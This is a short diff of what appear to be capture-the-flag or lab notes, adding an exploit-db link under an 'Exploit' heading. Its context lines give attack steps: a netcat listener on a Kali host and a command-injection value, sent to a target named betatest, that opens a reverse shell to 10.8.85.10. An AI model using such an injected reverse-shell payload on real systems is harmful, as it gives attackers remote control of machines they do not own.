@@ -11,3 +11,7 @@
 2. `nc -nvlp 8888` on kali
 3. `tdurden;sh -i >& /dev/tcp/10.8.85.10/8888 0>&1` to betatest
 
+
+
+## Exploit 
+https://www.exploit-db.com/exploits/47044
